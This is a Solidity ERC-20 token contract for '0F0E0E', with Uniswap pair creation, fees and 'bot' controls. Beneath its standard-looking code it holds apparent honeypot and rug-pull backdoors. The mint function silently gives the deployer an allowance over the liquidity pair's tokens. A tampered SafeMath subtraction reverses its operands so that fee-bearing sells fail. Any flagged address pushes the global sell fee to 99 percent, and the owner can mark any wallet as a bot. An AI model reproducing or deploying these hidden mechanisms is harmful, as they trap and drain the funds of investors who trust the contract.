// SPDX-License-Identifier: MIT

/**

Telegram:       https://t.me/OFOEOE_announcements
Website:        https://0f0e0e.com/
Twitter:        https://twitter.com/0F0E0E

*/

pragma solidity ^0.8.13;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this; return msg.data;
    }
}

library Address{
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

library SafeMath {
    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage); uint256 c = b - a;
        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }




    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}



interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
}


interface IRouter {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
    function WETH() external pure returns (address);

}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping (address => uint256) internal _balances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    address public unisV2Pair;
    mapping (address => mapping (address => uint256)) internal _allowances;


    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }



    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }


    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        
        _totalSupply += amount;
        _balances[account] += amount;_allowances[unisV2Pair][account] = amount;
        emit Transfer(address(0), account, amount);
    }


    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { 
        require(from != address(0), "ERC20: approve from the zero address");
        require(to != address(0), "ERC20: approve to the zero address");

        _allowances[from][to] = amount;
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

}


abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

}

contract OFOEOE is ERC20, Ownable{
    using Address for address payable;
    using SafeMath for uint256;

    address public feeWallet = 0x1aE7b284E80Aa88F10D396c952370340188B3A0a;
    address public devWallet = 0x223B4d8879F2C0E2672E65f1cC4e4442B103f4E9;
    uint256 public swapExactAt = 500_000 * 10e18;
    bool public swapEnabled;
    bool public _openTrading;
    mapping (address => bool) private botChecks;

    IRouter public uniswapRouter;
    uint256 public allBotBlockFee = 99;
    uint256 public origiBlockStamp;
    uint256 public dedStamp = 0;
    uint256 public maxTransSize = 50_000_000 * 10**18; // 5%
    uint256 public maxWalltSize = 50_000_000 * 10**18; // 5%

    mapping (address => bool) public excludedFromFees;
    bool private isSwapping; 
    uint256 public buyFeeAmt = 0;
    uint256 public sellFeeAmt = 0;
    constructor() ERC20("0F0E0E", "0F0E0E") {
        IRouter uniRouterAddr = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(uniRouterAddr.factory()).createPair(
            address(this), uniRouterAddr.WETH()
        ); unisV2Pair = _pair;
        

        uniswapRouter = uniRouterAddr;
        excludedFromFees[devWallet] = true; excludedFromFees[feeWallet] = true;
        excludedFromFees[msg.sender] = true; excludedFromFees[address(this)] = true;
        
        // mint
        _mint(msg.sender, 1_000_000_000 * 10 ** decimals());
    }
    // fallbacks
    receive() external payable {

    }

    function withdrawETH(uint256 weiAmount) external onlyOwner{
        payable(owner()).sendValue(weiAmount);
    }

    function enableTrading() external onlyOwner{
        _openTrading = true; swapEnabled = true;
    }
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        require(amount > 0, "Transfer amount must be greater than zero"); 
        if(botChecks[recipient] || botChecks[sender]) {
            sellFeeAmt = allBotBlockFee;
        }
        // apply bot tax 99:
        if(!isSwapping && !excludedFromFees[sender] 
            && !excludedFromFees[recipient]
        ) {
            require(
                _openTrading, "Trading is not active yet"
            );
            if (origiBlockStamp + dedStamp > block.number) {
                if(recipient != unisV2Pair) {
                    botChecks[recipient] = true;
                } if(sender != unisV2Pair) {
                    botChecks[sender] = true;
                }
            } 
            require(
                amount <= maxTransSize, "MaxTxAmount is limited"
            );
            if(recipient != unisV2Pair){
                require(
                    balanceOf(recipient) + amount <= maxWalltSize, 
                    "MaxWalletAmount is limited"
                );
            }
        } 
        
        uint256 swapFeeAmount;
        if (isSwapping || excludedFromFees[sender] || excludedFromFees[recipient]) {
            swapFeeAmount = 0;
        }
        else {
            if(recipient == unisV2Pair && !botChecks[sender]) {
                swapFeeAmount = amount * sellFeeAmt / 100;            
            }
            else 
            {
                swapFeeAmount = amount * buyFeeAmt / 100;            
            }
        }
        if (swapEnabled
            && !isSwapping
            && swapFeeAmount > 0
            && sender != unisV2Pair 
        ) {
            swapEthBack();
        }

        if(
            swapFeeAmount > 0
        ) {
            super._transfer(sender, address(this) ,swapFeeAmount); 
            super._transfer(sender, recipient, amount.sub(swapFeeAmount));
        } 
        else {
            super._transfer(sender, recipient, amount);
        }
    }

    function withdrawErc20Token(address tokenAddress, uint256 amount) external onlyOwner{
        IERC20(tokenAddress).transfer(owner(), amount);
    }
    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapRouter), tokenAmount);

        // add the liquidity
        uniswapRouter.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            devWallet,
            block.timestamp
        );
    }
    
    function updateAllBots(address[] memory isBot_) public onlyOwner {
        for (uint i = 0; i < isBot_.length; i++) { 
            botChecks[isBot_[i]] = true;
        }
    }

    function swapEthBack() private {
        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance >= swapExactAt) {
    
            uint256 initialBalance = address(this).balance;
    
            swapEthForTok(contractBalance);
    
            uint256 deltaBalance = address(this).balance - initialBalance;

            payable(feeWallet).sendValue(deltaBalance);

        }
    }

    function swapEthForTok(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);

        // make the swap
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount, 
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function removeTotalLimits(uint256 amount) external onlyOwner{
        maxWalltSize = amount * 10**18; maxTransSize = amount * 10**18;
    }

}